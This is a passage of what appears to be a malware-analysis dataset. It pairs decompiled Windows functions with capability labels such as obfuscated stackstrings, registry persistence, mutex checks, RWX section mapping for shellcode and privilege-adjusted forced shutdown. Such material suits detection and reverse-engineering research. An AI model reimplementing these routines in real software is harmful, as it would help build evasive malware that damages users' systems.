var_20h._3_1_ = 0x43;\n    var_1ch._0_1_ = 0x32;\n    var_1ch._1_1_ = 0x36;\n    var_1ch._2_2_ = 0x233f;\n    var_18h._0_2_ = 0x151e;\n    var_18h._2_1_ = 1;\n    var_18h._3_1_ = 0x53;\n    var_14h._0_1_ = 0x38;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x22;\n    var_14h._3_1_ = 0x25;\n    var_10h._0_1_ = 1;\n    var_10h._1_1_ = 5;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x5a;\n    var_ch._0_1_ = 7;\n    var_ch._1_1_ = 0x25;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x30;\n    var_8h._0_1_ = 0x24;\n    var_8h._1_1_ = 0;\n    var_8h._2_1_ = 9;\n    var_8h._3_1_ = 0x56;\n    var_4h._0_1_ = 0x32;\n    var_4h._1_1_ = 0x57;\n    var_2ch._0_1_ = 0x4d;\n    var_2ch._1_2_ = 0x6c6c;\n    var_2ch._3_1_ = 0x31;\n    var_28h._0_1_ = 0x57;\n    var_28h._1_1_ = 0x57;\n    var_28h._2_1_ = 0x4b;\n    var_28h._3_1_ = 0x46;\n    fcn.00401000(0x1e);\n    iVar6 = var_38h;\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_38h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_20h - var_38h];\n    } while (uVar7 < 0x1e);\n    fcn.0040b1a3();\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar3)(0, iVar8);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_84h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_108h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_dch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_104h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_94h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_54h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_f0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_d4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_fch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_10ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_64h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_110h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_c4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_ech);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_e0h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_b4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_e8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_44h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_f8h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_4ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_5ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_6ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_7ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_f4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_e4h);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_bch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_cch);\n    (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, var_100h);\n    (*pcVar2)(uVar4);\n    return;\n}\n",
        "token_count": 21081
    },
    "004045f0": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\nuint fcn.004045f0(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint *puVar7;\n    uint lpString;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0x52191e05;\n    var_4h = 0x482b540c;\n    var_10h = 0x31786c66;\n    puVar7 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_ch = 0x484e3967;\n    fcn.00401000(8);\n    uVar5 = 0;\n    do {\n        puVar1 = uVar5 + var_14h;\n        uVar2 = uVar5 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar5 = uVar5 + 1;\n        *puVar1 = *(&var_10h + uVar2) ^ puVar1[&var_8h - var_14h];\n    } while (uVar5 < 8);\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(var_14h, &lpString, 0x104);\n    uVar6 = 0;\n    if (iVar4 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar4 = fcn.004037a5();\n        if (iVar4 == -0x69b4c9f2) {\n            uVar6 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar6;\n}\n",
        "token_count": 516
    },
    "0040926d": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040926d(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0x24313962;\n    var_18h = 0x65342432;\n    var_14h = 0x3e222625;\n    var_10h._0_1_ = 0x45;\n    var_ch = 0x50435034;\n    var_8h = var_8h & 0xff000000 | 0x584547;\n    fcn.00401000(0xd);\n    iVar4 = var_4h;\n    iVar10 = 0;\n    iVar9 = &var_1ch - var_4h;\n    do {\n        var_4h = 7;\n        puVar1 = iVar10 + iVar4;\n        iVar7 = iVar10 % 7;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_ch + iVar7) ^ puVar1[iVar9];\n    } while (iVar10 < 0xd);\n    var_1ch = 0x163b333c;\n    var_18h = 0x78512e34;\n    var_14h = 0x14253279;\n    var_10h._0_1_ = 0x51;\n    var_ch = 0x78495657;\n    var_8h = 0x4a624251;\n    fcn.00401000(0xd);\n    iVar9 = var_4h;\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + var_4h;\n        uVar5 = uVar8 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_ch + uVar5) ^ puVar1[&var_1ch - var_4h];\n    } while (uVar8 < 0xd);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_4h, iVar4);\n    *0x41bde4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar4);\n    (*pcVar2)(uVar6);\n    return;\n}\n",
        "token_count": 738
    },
    "004094b9": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004094b9(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x41ba94;\n    var_ch = param_1;\n    if (*0x41bde0 == NULL) {\n        var_44h = 0x78392119;\n        var_40h = 0x2b242d05;\n        var_3ch = 0x192b222c;\n        var_38h = 0x7e7c1f5e;\n        var_34h = 0x2b1c3d08;\n        var_30h = 0x2f380155;\n        var_2ch = 0x21273a2d;\n        var_28h._0_2_ = 0x685f;\n        var_14h = 0x4e4e4e4e;\n        var_10h = 0x4a4a6831;\n        fcn.00401000(0x1e);\n        iVar3 = var_8h;\n        uVar7 = 0;\n        do {\n            puVar1 = uVar7 + var_8h;\n            uVar4 = uVar7 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar7 = uVar7 + 1;\n            *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_44h - var_8h];\n        } while (uVar7 < 0x1e);\n        var_24h = 0x163b333c;\n        var_20h = 0x78512e34;\n        var_1ch = 0x14253279;\n        var_18h._0_1_ = 0x51;\n        var_14h = 0x78495657;\n        var_10h = 0x4a624251;\n        fcn.00401000(0xd);\n        uVar7 = 0;\n        do {\n            puVar1 = uVar7 + var_8h;\n            uVar4 = uVar7 & 0x80000007;\n            if (uVar4 < 0) {\n                uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n            }\n            uVar7 = uVar7 + 1;\n            *puVar1 = *(&var_14h + uVar4) ^ puVar1[&var_24h - var_8h];\n        } while (uVar7 < 0xd);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_8h, iVar3);\n        *0x41bde0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        uVar5 = (*pcVar2)(0, iVar3);\n        (*pcVar6)(uVar5);\n        pcVar6 = *0x41bde0;\n        if (*0x41bde0 == NULL) goto code_r0x004095fe;\n    }\n    iVar3 = var_ch;\n    pcVar6 = (**0x41bde0)(var_ch);\n    if (pcVar6 != '\\0') {\n        *0x41ba94 = iVar3 != 0;\n    }\ncode_r0x004095fe:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1063
    },
    "0040cd32": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cd32(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint hKey;\n    \n    hKey = 0;\n    var_14h = *0x41ba50;\n    var_44h = 0x4a5e461c;\n    var_40h = 0x6110691f;\n    var_3ch = 0x4a504638;\n    var_38h = 0x6101690b;\n    var_34h = 0x4a7c4613;\n    var_30h._0_2_ = 0x6910;\n    var_10h = 7;\n    var_30h._2_1_ = 7;\n    stack0xffffffcf = 0x5e463d61;\n    var_29h = 0xb690a4a;\n    var_25h = 0x45462961;\n    var_21h._0_1_ = 0x4a;\n    var_21h._1_1_ = 0x79;\n    var_21h._2_1_ = 0x69;\n    var_1ch = 0x4a31464f;\n    var_18h = 0x61646979;\n    fcn.00401000(0x4c);\n    iVar6 = var_8h;\n    uVar5 = 0;\n    do {\n        puVar1 = uVar5 + var_8h;\n        uVar2 = uVar5 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar5 = uVar5 + 1;\n        *puVar1 = *(&var_1ch + uVar2) ^ puVar1[&var_44h - var_8h];\n    } while (uVar5 < 0x26);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, var_8h, 0, 0xf003f, &hKey);\n    if (iVar3 == 0) {\n        var_3ch = 0x7613597b;\n        var_38h = 0x38544722;\n        var_34h = 0x50196715;\n        var_30h._0_2_ = 0x3820;\n        var_30h._2_1_ = 0x75;\n        stack0xffffffcf = 0x28760659;\n        var_29h = 0x30386b47;\n        var_25h = 0x22500c67;\n        var_21h._0_1_ = 0x38;\n        var_21h._1_1_ = 0x38;\n        var_21h._2_1_ = 0x59;\n        var_1ch = 0x76675938;\n        var_18h = var_18h & 0xff000000 | 0x384750;\n        fcn.00401000(0x3c);\n        iVar6 = 0;\n        do {\n            puVar1 = iVar6 + var_ch;\n            iVar3 = iVar6 % var_10h;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_1ch + iVar3) ^ puVar1[&var_3ch - var_ch];\n        } while (iVar6 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_ch, 0, 4, &var_14h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar6 = var_8h;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1093
    },
    "0040ceb4": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040ceb4(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    hKey = 0;\n    var_4h = 0;\n    var_1ch = 4;\n    var_18h = 4;\n    var_4ch = 0x4a5e461c;\n    var_48h = 0x6110691f;\n    var_44h = 0x4a504638;\n    var_40h = 0x6101690b;\n    var_3ch = 0x4a7c4613;\n    var_38h._0_2_ = 0x6910;\n    var_14h = 7;\n    var_38h._2_1_ = 7;\n    stack0xffffffc7 = 0x5e463d61;\n    var_31h = 0xb690a4a;\n    var_2dh = 0x45462961;\n    var_29h._0_1_ = 0x4a;\n    var_29h._1_1_ = 0x79;\n    var_29h._2_1_ = 0x69;\n    var_24h = 0x4a31464f;\n    var_20h = 0x61646979;\n    fcn.00401000(0x4c);\n    iVar7 = var_ch;\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_ch;\n        uVar2 = uVar6 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_24h + uVar2) ^ puVar1[&var_4ch - var_ch];\n    } while (uVar6 < 0x26);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, var_ch, 0, 0x20019, &hKey);\n    if (iVar3 == 0) {\n        var_44h = 0x7613597b;\n        var_40h = 0x38544722;\n        var_3ch = 0x50196715;\n        var_38h._0_2_ = 0x3820;\n        var_38h._2_1_ = 0x75;\n        stack0xffffffc7 = 0x28760659;\n        var_31h = 0x30386b47;\n        var_2dh = 0x22500c67;\n        var_29h._0_1_ = 0x38;\n        var_29h._1_1_ = 0x38;\n        var_29h._2_1_ = 0x59;\n        var_24h = 0x76675938;\n        var_20h = var_20h & 0xff000000 | 0x384750;\n        fcn.00401000(0x3c);\n        iVar7 = 0;\n        do {\n            puVar1 = iVar7 + var_10h;\n            iVar3 = iVar7 % var_14h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar3) ^ puVar1[&var_44h - var_10h];\n        } while (iVar7 < 0x1e);\n        iVar7 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, var_10h, 0, &var_1ch, &var_4h, &var_18h);\n        if (iVar7 != 0) {\n            var_4h = 0;\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar7 = var_ch;\n    }\n    uVar4 = var_4h;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    return uVar4;\n}\n",
        "token_count": 1171
    },
    "0040dd7c": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040dd7c(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_40h = 0x4e334611;\n    var_3ch = 0x42337121;\n    var_38h = 0x532d562f;\n    var_34h._0_2_ = 0x4514;\n    var_8h = 7;\n    var_34h._2_1_ = 7;\n    stack0xffffffcb = 0x274e3846;\n    var_2dh = 0x3f423771;\n    var_29h = 0x1e531e56;\n    var_25h = 0x38462b45;\n    var_21h = 0x1171274e;\n    var_1dh = 0x3c562e42;\n    var_19h = 0x23451453;\n    var_15h = 0x534e3246;\n    var_11h._0_1_ = 0x71;\n    stack0xffffffec = 0x4e564642;\n    var_ch._0_2_ = 0x7153;\n    var_ch._2_1_ = 0x45;\n    fcn.00401000(0x60);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_4h;\n        iVar4 = iVar5 % var_8h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_11h + iVar4 + 1) ^ puVar1[&var_40h - var_4h];\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, var_4h);\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, var_4h);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 669
    },
    "0040a4d4": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040a4d4(uint arg_8h, uint lpParameters)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00406313(arg_8h);\n    if (uVar1 == 0) {\n        uVar1 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x40fb1c);\n        if (0x20 < uVar1) {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "0040d051": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040d051(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41be10, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "00406c49": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "map section object"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406c49(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_ch;\n    uint var_4h;\n    \n    puVar3 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_4h = 0;\n    uVar1 = (*_sym.imp.ntdll.dll_NtMapViewOfSection)();\n    (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(uVar1);\n    return;\n}\n",
        "token_count": 160
    },
    "0040c22a": {
        "rules": [
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\nvoid fcn.0040c22a(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t var_4h;\n    \n    var_34h = 0xa3d1532;\n    var_30h = 0x82d0326;\n    var_2ch = 0x103e1e16;\n    var_28h = 0xb20013a;\n    var_24h = 0x620b1704;\n    var_10h = 0x626e7061;\n    var_ch = 0x67497753;\n    fcn.00401000(0x14);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_4h;\n        uVar3 = uVar6 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_10h + uVar3) ^ puVar1[&var_34h - var_4h];\n    } while (uVar6 < 0x14);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar4);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, var_4h, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar5 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar5 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 608
    },
    "00405f95": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.00405f95(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "004065c5": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004065c5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.00405f95();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040a506();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 189
    },
    "00406c8b": {
        "rules": [
            "create or open section object"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406c8b(int32_t *arg_8h)\n\n{\n    uint *in_EDX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint *var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    puVar2 = &var_3ch;\n    var_10h = in_EDX;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_8h = 0;\n    puVar2 = &var_1ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_ch = NULL;\n    puVar2 = &var_24h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    var_30h = 0x40;\n    var_3ch = 0x18;\n    var_38h = 0;\n    var_34h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    iVar1 = (*_sym.imp.ntdll.dll_NtCreateSection)(&var_8h, 0xf001f, &var_3ch, &var_1ch, 0x40, 0x8000000, 0);\n    if (iVar1 < 0) {\n        iVar1 = (*_sym.imp.ntdll.dll_RtlNtStatusToDosError)(iVar1);\n    }\n    else {\n        iVar1 = fcn.00406c49(&var_ch);\n        puVar3 = var_ch;\n        if (iVar1 == 0) {\n            for (; var_1ch != 0; var_1ch = var_1ch + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *var_10h = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.ntdll.dll_ZwClose)(var_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 655
    },
    "0040b1a3": {
        "rules": [
            "modify access privileges"
        ],
